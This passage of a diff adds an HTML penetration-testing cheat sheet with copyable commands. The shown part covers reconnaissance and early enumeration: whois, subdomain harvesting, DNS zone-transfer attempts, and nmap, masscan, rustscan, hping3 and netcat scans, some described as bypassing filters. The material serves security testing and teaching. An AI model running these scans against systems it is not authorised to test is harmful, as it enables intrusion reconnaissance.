@@ -1,0 +1,755 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Pen Testing Cheat Sheet — Final</title>
+  <style>
+    :root{
+      --bg1: #071024;
+      --bg2: #0b1622;
+      --card: #071a26;
+      --muted: #9aa6b2;
+      --accent: #7dd3fc;
+      --cmd: #9be7ff;
+      --purpose: #9fb0bb;
+      --glass: rgba(255, 255, 255, 0.03);
+      --glow: rgba(125, 211, 252, 0.1);
+    }
+
+    /* Subtle Page Load Animation */
+    @keyframes fadeInUp {
+      from {
+        opacity: 0;
+        transform: translateY(15px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    *{
+      box-sizing: border-box;
+      scrollbar-color: var(--accent) transparent;
+      scrollbar-width: thin;
+    }
+    
+    /* Custom Scrollbar for Webkit Browsers */
+    ::-webkit-scrollbar {
+      width: 8px;
+    }
+    ::-webkit-scrollbar-track {
+      background: transparent;
+    }
+    ::-webkit-scrollbar-thumb {
+      background-color: var(--accent);
+      border-radius: 10px;
+      border: 3px solid var(--bg2);
+    }
+
+    html {
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    body{
+      height:100%;
+      margin:0;
+      font-family: Inter, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial, sans-serif;
+      /* Enhanced Background with "Aurora" Effect */
+      background: 
+        radial-gradient(ellipse 80% 70% at 50% -20%, var(--glow), transparent),
+        linear-gradient(180deg, var(--bg1), var(--bg2)) fixed;
+      color:#e6eef6;
+      font-size:16px;
+      animation: fadeInUp 0.5s ease-out forwards;
+    }
+    
+    .wrap{max-width:1150px;margin:26px auto;padding:20px}
+    header{display:flex;align-items:center;justify-content:space-between;gap:12px}
+    h1{
+        font-size:24px;
+        margin:0;
+        text-shadow: 0 0 15px var(--glow);
+    }
+    .subtitle{color:var(--muted);font-size:14px; margin-top: 4px;}
+    .phases{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:16px 0}
+    
+    .phase-btn{
+      background:var(--glass);
+      backdrop-filter: blur(20px);
+      border:1px solid rgba(255,255,255,0.04);
+      padding:12px;
+      border-radius:12px;
+      text-align:center;
+      cursor:pointer;
+      user-select:none;
+      transition: transform 0.2s, box-shadow 0.2s, background-color 0.2s;
+    }
+    .phase-btn:hover{
+      transform: translateY(-4px);
+      background-color: rgba(125, 211, 252, 0.05);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+    }
+    .phase-btn.active{
+      outline: 2px solid var(--accent);
+      box-shadow: 0 0 25px var(--glow);
+    }
+
+    main{
+      margin-top:18px;
+      padding:18px;
+      border-radius:16px;
+      background:linear-gradient(180deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));
+      backdrop-filter: blur(18px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      box-shadow: 0 20px 60px rgba(2,8,23,0.8);
+    }
+
+    .controls{display:flex;gap:8px;align-items:center;max-width:480px}
+    input[type=search]{
+      flex:1;
+      padding:12px;
+      border-radius:10px;
+      border:1px solid rgba(255,255,255,0.04);
+      background:rgba(0,0,0,0.2);
+      color:inherit;
+      font-size:15px;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    input[type=search]::placeholder {
+      color: var(--muted);
+      opacity: 0.7;
+    }
+    input[type=search]:focus {
+      outline: none;
+      border-color: var(--accent);
+      box-shadow: 0 0 10px var(--glow);
+    }
+
+    .tool-list{margin-top:12px}
+    .section-purpose{color:var(--purpose);font-size:14px;margin:12px 0 18px 0;padding:14px;border-left:3px solid rgba(255,255,255,0.02);background:rgba(255,255,255,0.01);border-radius:8px;font-weight:400}
+    
+    .tool{
+      border:1px solid rgba(255,255,255,0.03);
+      margin:12px 0;
+      border-radius:12px;
+      overflow:hidden;
+      background:linear-gradient(90deg, rgba(255,255,255,0.01), rgba(255,255,255,0.005));
+      backdrop-filter: blur(10px);
+      padding:0;
+      transition: box-shadow 0.2s;
+    }
+    .tool:hover {
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+    }
+    .tool > summary{
+      list-style:none;
+      cursor:pointer;
+      padding:14px 16px;
+      display:flex;
+      justify-content:space-between;
+      align-items:center;
+      font-weight:700;
+      font-size:16px;
+      transition: background-color 0.2s;
+    }
+    .tool > summary:hover {
+        background-color: rgba(125, 211, 252, 0.03);
+    }
+    .tool[open] > summary {
+        background-color: rgba(125, 211, 252, 0.05);
+    }
+
+    .tool .content{padding:14px;border-top:1px solid rgba(255,255,255,0.02);background:rgba(1,9,14,0.7)}
+    .tool-purpose{color:var(--purpose);font-size:14px;margin-bottom:12px;padding:10px;border-left:3px solid var(--accent);background:rgba(125, 211, 252, 0.05);border-radius:6px}
+    
+    .cmd-block{
+      display:flex;
+      align-items:flex-start;
+      gap:12px;
+      margin:10px 0;
+      padding:10px;
+      border-radius:8px;
+      background:rgba(0,0,0,0.22);
+      border:1px solid rgba(255,255,255,0.02);
+    }
+    .copy-left{
+      order:0;
+      flex:0 0 auto;
+      background:var(--accent);
+      color:#012;
+      border:none;
+      padding:8px 10px;
+      border-radius:8px;
+      cursor:pointer;
+      font-weight:700;
+      transition: transform 0.1s, background-color 0.2s;
+    }
+    .copy-left:active {
+        transform: scale(0.95);
+    }
+    .copy-left.copied{background:#4ade80}
+    
+    .cmd-and-desc{display:flex;flex-direction:column;gap:6px}
+    code.cmd{
+        font-family: 'SFMono-Regular', Menlo, Monaco, Consolas, monospace;
+        font-size:15px;
+        color:var(--cmd);
+        font-weight:700;
+        white-space:pre-wrap;
+        line-height: 1.4;
+    }
+    .cmd-desc{color:var(--muted);font-size:14px; line-height: 1.5;}
+    
+    details[open] summary::after{content:"−";font-weight:700}
+    summary::after{content:"+";font-weight:700}
+    
+    h3.attack-title { 
+        margin-top: 24px; 
+        margin-bottom: -4px; 
+        color: var(--accent); 
+        border-bottom: 1px solid rgba(255,255,255,0.1); 
+        padding-bottom: 8px;
+        text-shadow: 0 0 10px var(--glow);
+    }
+    .attack-desc { margin: 12px; padding: 10px; background: rgba(0,0,0,0.1); border-radius: 8px; }
+    .attack-desc h4 { margin-top: 0; color: #bdeaff; }
+    .attack-desc p, .attack-desc li { margin-bottom: 8px; line-height: 1.5; }
+    .attack-desc ol { padding-left: 20px; }
+
+    @media(max-width:1100px){.phases{grid-template-columns:repeat(3,1fr)}}
+    @media(max-width:700px){.phases{grid-template-columns:repeat(2,1fr)};header{flex-direction:column;align-items:flex-start}}
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <header>
+      <div>
+        <h1>🛡️ Pen Testing Cheat Sheet</h1>
+        <div class="subtitle">A comprehensive cheat sheet covering the 6 phases of penetration testing.</div>
+      </div>
+      <div class="controls">
+        <input id="search" type="search" placeholder="Search tools or commands..." />
+        <button id="clear" class="copy-left" style="background:transparent;color:var(--muted);border:1px solid rgba(255,255,255,0.04);">Clear</button>
+      </div>
+    </header>
+
+    <div class="phases" role="list">
+      <div class="phase-btn" data-phase="recon">1. Reconnaissance</div>
+      <div class="phase-btn" data-phase="enum">2. Enumeration</div>
+      <div class="phase-btn" data-phase="exploit">3. Exploitation</div>
+      <div class="phase-btn" data-phase="post">4. Post-Exploitation</div>
+      <div class="phase-btn" data-phase="persist">5. Persistence & Tracks</div>
+      <div class="phase-btn" data-phase="report">6. Reporting</div>
+    </div>
+
+    <main id="main">
+
+      <section class="tool-list" id="recon">
+        <div class="section-purpose">Purpose: Collect target info (domains, subdomains, ports, services).</div>
+
+        <details class="tool"><summary>whois <span class="meta">Domain ownership info</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Get ownership, registrar, IP/netblock details from WHOIS services.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whois domain.com</code><div class="cmd-desc">Get domain registrar, IP ranges.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whois &lt;IP&gt;</code><div class="cmd-desc">Find who owns an IP/netblock.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">whois -h whois.arin.net &lt;IP&gt;</code><div class="cmd-desc">Query ARIN specifically (North America).</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>amass / subfinder <span class="meta">Subdomain enumeration</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Discover subdomains using both passive (amass, subfinder) and active techniques.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">amass enum -d domain.com -o recon/amass.txt</code><div class="cmd-desc">Deep passive/active subdomains.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">subfinder -d domain.com -o recon/subfinder.txt</code><div class="cmd-desc">Fast subdomain discovery.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>theHarvester <span class="meta">Emails & subdomains</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Gather emails, subdomains, and hosts from public sources like search engines.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">theHarvester -d domain.com -b google -l 200</code><div class="cmd-desc">Collect emails, hosts via Google.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">theHarvester -d domain.com -b bing</code><div class="cmd-desc">Collect via Bing search.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>dig / host / nslookup <span class="meta">DNS lookups</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Perform DNS and reverse lookups, query records, and test for zone transfers.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dig +short domain.com</code><div class="cmd-desc">Get A record (IP address).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dig -x &lt;IP&gt;</code><div class="cmd-desc">Reverse lookup (IP → domain).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dig mx domain.com</code><div class="cmd-desc">Get mail servers.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">host domain.com</code><div class="cmd-desc">Quick DNS lookup.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dig axfr @ns1.domain.com domain.com</code><div class="cmd-desc">Attempt zone transfer.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nslookup domain.com</code><div class="cmd-desc">Quick DNS lookup (Windows).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nslookup -type=MX domain.com</code><div class="cmd-desc">Get mail servers (Windows).</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Nmap — Host Discovery</summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Discover live hosts on a network before port scanning.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PR -sn 192.168.1.0/24</code><div class="cmd-desc">ARP Scan (Best for LAN, fastest & most reliable).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PE -sn 192.168.1.0/24</code><div class="cmd-desc">ICMP Echo (Normal ping, works if not blocked).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PP -sn 192.168.1.0/24</code><div class="cmd-desc">ICMP Timestamp (Bypass some ping filters).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PM -sn 192.168.1.0/24</code><div class="cmd-desc">ICMP Address Mask (Rare, but can reveal devices).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PS22,80,443 -sn 192.168.1.0/30</code><div class="cmd-desc">TCP SYN Ping (When ICMP is blocked, knock on common ports).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PA22,80,443 -sn 192.168.1.0/30</code><div class="cmd-desc">TCP ACK Ping (Detects hosts via RST replies).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -PU53,161,162 -sn 192.168.1.0/30</code><div class="cmd-desc">UDP Ping (Useful for DNS/SNMP services).</div></div></div>
+          <div class="tool-purpose" style="margin-top: 16px;">Extra Options:</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-sn</code><div class="cmd-desc">Host discovery only (no port scan).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-n</code><div class="cmd-desc">Skip DNS lookup (faster).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-R</code><div class="cmd-desc">Force reverse-DNS lookup.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Nmap — Basic Port Scans</summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Identify open TCP/UDP ports and running services on a live host.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -sT &lt;target&gt;</code><div class="cmd-desc">TCP Connect Scan (no root, basic open port check).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -sS &lt;target&gt;</code><div class="cmd-desc">TCP SYN Scan (half-open, stealthy, needs sudo).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -sU &lt;target&gt;</code><div class="cmd-desc">UDP Scan (slow, noisy, needs sudo).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -p 22,80,443 &lt;target&gt;</code><div class="cmd-desc">Scan specific ports (common services, faster than full scan).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -p 1-65535 &lt;target&gt;</code><div class="cmd-desc">Scan all ports (full enumeration, slow).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -p- &lt;target&gt;</code><div class="cmd-desc">Scan all ports (shorthand for 1-65535).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -p 10000-65535 &lt;target&gt;</code><div class="cmd-desc">To scan a range beyond 1000.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -sU -p 10000-65535 &lt;target&gt;</code><div class="cmd-desc">To scan a UDP range beyond 1000.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Nmap — Version / OS / Scripts</summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Identify service versions, operating system, and run NSE scripts on a target.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -sS -sV -p &lt;ports&gt; &lt;target&gt;</code><div class="cmd-desc">Service/version detection.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -O &lt;target&gt;</code><div class="cmd-desc">OS detection (needs privileges).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -A &lt;target&gt;</code><div class="cmd-desc">Aggressive: -sV -O + default scripts.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap --script=banner,vuln -p &lt;ports&gt; &lt;target&gt;</code><div class="cmd-desc">Run specific NSE scripts.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -sV -T4 -sC -p22 &lt;target-ip&gt;</code><div class="cmd-desc">Investigates a specific port for version info and weaknesses.</div></div></div>
+          <div class="tool-purpose" style="margin-top: 16px;">Extra Options:</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-sV</code><div class="cmd-desc">Detects the version of the service running.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-sC</code><div class="cmd-desc">Runs default scripts to find more details.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">-T4</code><div class="cmd-desc">Uses an aggressive timing template to scan faster.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Nmap — Performance & Discovery</summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Adjust scan speed, timing, and discovery options to optimize performance or bypass filters.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -T4 &lt;target&gt;</code><div class="cmd-desc">Faster timing for labs.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -T0 &lt;target&gt;</code><div class="cmd-desc">Paranoid timing (slow).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap --min-parallelism=64 &lt;target&gt;</code><div class="cmd-desc">Increase parallel probes (speed up scan, more aggressive).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -Pn &lt;target&gt;</code><div class="cmd-desc">Skip host discovery (treat as up).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap --top-ports 100 &lt;target&gt;</code><div class="cmd-desc">Scan top 100 common ports.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Nmap — Output</summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Save scan results in different formats for reporting, analysis, or future reference.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -oN output.txt &lt;target&gt;</code><div class="cmd-desc">Normal text output.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo nmap -oA recon/target &lt;target&gt;</code><div class="cmd-desc">Save all formats (Nmap, XML, grepable).</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>dnsenum <span class="meta">Automated DNS checks</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Automate DNS checks with multithreading and reporting capabilities.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsenum example.com</code><div class="cmd-desc">Run automated DNS checks and subdomain discovery.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsenum --enum --threads 10 example.com</code><div class="cmd-desc">Speed up enumeration with multithreading.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsenum example.com --output dnsenum_report</code><div class="cmd-desc">Export structured output for analysis.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>dnsrecon <span class="meta">Detailed DNS reconnaissance</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Perform detailed DNS reconnaissance including brute-force and AXFR checks.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsrecon -d example.com -a</code><div class="cmd-desc">Perform common DNS checks (AXFR, SRV, SOA, etc.).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsrecon -d example.com -b wordlist.txt</code><div class="cmd-desc">Brute-force subdomains using provided wordlist.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">dnsrecon -d example.com -t std,axfr -j dnsrecon.json</code><div class="cmd-desc">Specify check types and export to JSON.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>ping <span class="meta">Basic connectivity checks</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Identify live hosts and perform basic connectivity checks using ICMP packets.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping -c 4 &lt;IP&gt;</code><div class="cmd-desc">Send 4 ICMP packets (basic connectivity test).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping -i 2 &lt;IP&gt;</code><div class="cmd-desc">Wait 2 seconds between packets (reduce noise).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping -s 100 &lt;IP&gt;</code><div class="cmd-desc">Send 100-byte packets (test MTU & fragmentation).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping -t &lt;IP&gt;</code><div class="cmd-desc">(Windows) Continuous ping until stopped (Ctrl+C).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping -a &lt;IP&gt;</code><div class="cmd-desc">(Windows) Attempt reverse DNS (IP → hostname).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">ping6 &lt;IPv6&gt;</code><div class="cmd-desc">Test connectivity to IPv6 hosts.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>fping <span class="meta">Fast ICMP sweeps</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Perform fast ICMP sweeps to discover live hosts across network ranges.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">fping -a -g 10.0.0.0/24 -r 0</code><div class="cmd-desc">Ping sweep a network with responsive hosts listed.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">fping -f hosts.txt</code><div class="cmd-desc">Read targets from file for bulk checks.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">fping -s -t 100 10.0.0.1</code><div class="cmd-desc">Report statistics and set timeout in ms.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>arp-scan <span class="meta">Discover local hosts</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Discover hosts on the local Ethernet broadcast domain using ARP requests.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo arp-scan --localnet</code><div class="cmd-desc">Discover live hosts on the local broadcast domain.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo arp-scan -I eth0 192.168.1.0/24</code><div class="cmd-desc">Specify interface and subnet for precise scans.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">sudo arp-scan --retry=2 10.0.0.0/24</code><div class="cmd-desc">Increase retries to improve detection.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>hping3 <span class="meta">Craft custom packets</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Craft custom packets for probing, firewall testing, and stealthy network scans.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">hping3 -S -p 80 example.com --count 3</code><div class="cmd-desc">Send SYN packets to test TCP port reachability.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">hping3 --icmp example.com -c 4</code><div class="cmd-desc">ICMP ping with hping3 for network probing.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">hping3 --scan 1-1024 example.com</code><div class="cmd-desc">Port scan using crafted packets.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>traceroute / tracert <span class="meta">Map network hops</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Map the network hops and measure latency to a target host.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">traceroute example.com</code><div class="cmd-desc">Discover network path and hops to a host.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">traceroute -I example.com</code><div class="cmd-desc">Use ICMP instead of UDP packets.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">traceroute -w 2 -q 1 example.com</code><div class="cmd-desc">Reduce wait and probe count for faster output.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">tracert <IP></code><div class="cmd-desc">Windows equivalent to traceroute.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>mtr <span class="meta">Route & latency monitoring</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Provide continuous route and latency monitoring for stability analysis.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">mtr --report example.com</code><div class="cmd-desc">Run one-time MTR report to analyze routes.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">mtr -r -c 100 example.com</code><div class="cmd-desc">Generate report with specific count for statistics.</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">mtr --report-cycles 50 example.com</code><div class="cmd-desc">Set report cycles for more samples.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Exiftool <span class="meta">Extract file metadata</span></summary><div class="content">
+          <div class="tool-purpose">Tool purpose: Extract, view, and edit metadata from files for OSINT and enumeration.</div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">exiftool file.jpg</code><div class="cmd-desc">Prints every metadata tag (camera, timestamps, software, GPS, etc.).</div></div></div>
+          <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">exiftool -a -u -g1 file.jpg</code><div class="cmd-desc">-a shows duplicate tags, -u shows unknown tags, and -g1 groups by metadata type.</div></div></div>
+        </div></details>
+      </section>
+
+      <section class="tool-list" id="enum" style="display:none">
+        <div class="section-purpose">Purpose: Identify versions, directories, users, and misconfigurations.</div>
+        
+        <details class="tool"><summary>Nmap <span class="meta">Service version & scripts</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Run deeper scans to identify service versions and check for known vulnerabilities using scripts.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nmap -sV -sC -p- &lt;target&gt;</code><div class="cmd-desc">Comprehensive scan for service versions and default scripts on all ports.</div></div></div>
+        </div></details>
+        
+        <details class="tool"><summary>Masscan <span class="meta">Fast port scanning</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Scan large address spaces at high speed to quickly identify open ports.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">masscan &lt;IP&gt; -p1-65535 --rate=1000</code><div class="cmd-desc">Full TCP port scan with speed limit.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">masscan &lt;IP&gt; -p80,443</code><div class="cmd-desc">Scan specific ports (web services).</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">masscan &lt;CIDR&gt; -p22,3389 --rate=5000</code><div class="cmd-desc">Find SSH/RDP across a subnet.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">masscan &lt;IP&gt; --top-ports 100</code><div class="cmd-desc">Scan top 100 most common ports.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>Rustscan <span class="meta">Fast port discovery</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: Extremely fast port discovery that hands off to Nmap for deeper scans.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">rustscan -a example.com -b 6000 -t 500 -- -A -sV -p</code><div class="cmd-desc">Perform fast port discovery and pass results to Nmap.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">rustscan -a 10.0.0.1 -r 1-65535 -u 2000</code><div class="cmd-desc">Specify port range and increase threads for speed.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">rustscan -a example.com --ulimit 5000 -g</code><div class="cmd-desc">Adjust ulimit for performance and generate commands.</div></div></div>
+        </div></details>
+
+        <details class="tool"><summary>Netcat (nc) <span class="meta">TCP/UDP utility</span></summary><div class="content">
+            <div class="tool-purpose">Tool purpose: A versatile client for banner grabbing, establishing connections, shells, and file transfers.</div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">nc -vz example.com 22 80 443</code><div class="cmd-desc">TCP connect scan for basic open port checking.</div></div></div>
+            <div class="cmd-block"><button class="copy-left">Copy</button><div class="cmd-and-desc"><code class="cmd">echo 'GET / HTTP/1.0\r\n\r\n' | nc example.com 80</code><div class="cmd-desc">Simple HTTP banner grab via raw TCP.</div></div></div>
